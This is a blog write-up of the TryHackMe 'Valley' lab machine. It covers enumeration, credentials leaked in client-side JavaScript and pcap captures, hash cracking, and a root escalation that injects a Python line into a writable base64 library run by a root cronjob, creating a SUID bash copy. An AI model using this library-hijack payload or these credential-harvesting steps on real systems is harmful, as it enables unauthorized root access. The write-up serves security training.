---
title: "TryHackMe - Valley"
author: Nasrallah
description: ""
date: 2023-05-25 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, crack, ftp, wireshark, cronjob]
img_path: /assets/img/tryhackme/valley
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Valley](https://tryhackme.com/room/valleype) from [TryHackMe](https://tryhackme.com). The target is a linux machine running a web server, after some enumeration we find a note that leaks a hidden login page, the latter uses clientside javascript code for authentication so we we're able to read clear text credentials, we use that to authenticate to an FTP server where we find some pcap files, inside one of the captures we find other credentials that works for ssh. Once got access to the machine we find a binary that checks for username and password, we use `strings` to get the password and access another user. A cronjob running every minute executes a python file that imports a writable library, so we write the latter to get root access.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.118.29
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2842ac1225a10f16616dda0f6046295 (RSA)
|   256 429e2ff63e5adb51996271c48c223ebb (ECDSA)
|_  256 2ea0a56cd983e0016cb98a609b638672 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found SSH and HTTP.

## Web

Let's check the web page.

![](1.png)

It's a photography company, we find two link in the website, one goes to gallery.

![](2.png)

The other goes to pricing.

![](3.png)

The two page are static html file on a directory with the same name `/gallery/gallery.html` and `/pricing/pricing.html`.

Let's check the directories to see if there is any other files.

![](4.png)

Gallery only has the html file.

![](5.png)

On /pricing we found `note.txt`.

```text
J,
Please stop leaving notes randomly on the website
-RP
```

Someone is leaving notes on the website.

On other directory we didn't check is the one where the image are at which is `/static`

![](6.png)

We don't see the images even though they are there.

Let's run a file scan on that directory.

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.118.29/static -x txt                                                                 
===============================================================                
Gobuster v3.1.0                                                                
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================                                                                                               
[+] Url:                     http://10.10.118.29/static                        
[+] Method:                  GET                                               
[+] Threads:                 10                                                
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt                 
[+] Negative Status codes:   404       
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt                                                                                                                              
[+] Timeout:                 10s
===============================================================                
2023/05/27 10:19:35 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]                                
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/00                   (Status: 200) [Size: 127]
/11                   (Status: 200) [Size: 627909]

```

We found `/00` file, let's check it out.

![](7.png)

It's the note we were looking for and it reveal a web directory.

![](8.png)

It's a login page, I checked the source code and found a `dev.js` file that handles the authentication.

![](9.png)

Inside of the file we find credentials and another note file.

![](10.png)

The note revealed two important things, a password reuse and and there is a FTP server running on a nonstandard port.

Let's run an nmap scan for all ports.

```terminal
map scan report for 10.10.118.29
Host is up (0.12s latency).
Not shown: 65515 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
384/tcp   filtered arns
1145/tcp  filtered x9-icue
1884/tcp  filtered idmaps
12144/tcp filtered unknown
13615/tcp filtered unknown
25551/tcp filtered unknown
27883/tcp filtered unknown
28933/tcp filtered unknown
29982/tcp filtered unknown
30018/tcp filtered unknown
33005/tcp filtered unknown
37370/tcp open     unknown
37856/tcp filtered unknown
40191/tcp filtered unknown
52799/tcp filtered unknown
53736/tcp filtered unknown
55790/tcp filtered unknown
63263/tcp filtered unknown
```

Found port 37370 open, it must be the FTP server.

![](11.png)

We logged using the credentials we got earlier and found three pcap files.

## Wireshark

After opening the files with wireshark, we check them one by one, and in one of the files we find an HTTP POST request.

![](12.png)

We right click on the packet and follow the http stream

![](13.png)

We found another pair of credentials.

# **Foothold**

Let's now ssh to the target.

```terminal
$ ssh valleyDev@10.10.102.17                                                                                                                       130 ⨯
The authenticity of host '10.10.102.17 (10.10.102.17)' can't be established.
ECDSA key fingerprint is SHA256:FXFNT9NFnKkrWkvCpeoDAJlr/IEVsKJjboVsCYH3pGE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.102.17' (ECDSA) to the list of known hosts.
valleyDev@10.10.102.17's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ id
uid=1002(valleyDev) gid=1002(valleyDev) groups=1002(valleyDev)
valleyDev@valley:~$ 
```

Great! We got in.


# **Privilege Escalation**

On the `/home` directory we find an unusual binary file.

```terminal
valleyDev@valley:~$ cd /home/
valleyDev@valley:/home$ ls -l
total 744
drwxr-x---  4 siemDev   siemDev     4096 Mar 20 20:03 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20 20:54 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13 08:17 valleyDev
valleyDev@valley:/home$ file valleyAuthenticator
valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
valleyDev@valley:/home$ ./valleyAuthenticator
Welcome to Valley Inc. Authenticator
What is your username: valley
What is your password: valley
Wrong Password or Username
valleyDev@valley:/home$
```

After running the file it prompts us for a username and a password.

A password must be in the file to make the comparison with.

I transferred the file to my machine and run strings on it.

![](14.png)

We found the part were the authentication works and there is a string that looks like an md5 hash, let's copy it and crack it.

![](15.png)

We got a password.

Since the file belongs to user valley, the password must be his.

```terminal
valleyDev@valley:~$ su valley
Password: 
valley@valley:/home/valleyDev$
```

It is.

## valley --> root

Checking the crontab file:

```terminal
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```

There is a python script running every minute, let's check it.

```python
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)

```

The script import `base64` library, goes to `/photos` and opens every jpg file from `p1.jpg to p7.jpg` through a loop, encodes every file with base64 and write it to `/photos/photoVault`.

Nothing we can do to exploit the script but the one thing that's left is the `base64` library, if it's writable we can exploit it.

```terminal
valley@valley:~$ find / -type f -name 'base64.py' -ls 2>/dev/null
   263097     20 -rwxrwxr-x   1 root     valleyAdmin    20382 Mar 13 03:26 /usr/lib/python3.8/base64.py
     3929     20 -rwxr-xr-x   1 root     root           20382 Nov 14  2022 /snap/core20/1828/usr/lib/python3.8/base64.py
     3906     20 -rwxr-xr-x   1 root     root           20382 Jun 22  2022 /snap/core20/1611/usr/lib/python3.8/base64.py
```

Lucky for us it is writable.

We can inject the following python script to it that would create a copy of bash with suid permission into `/tmp`

```python
import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
```

![](16.png)

Nice, we got root.


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
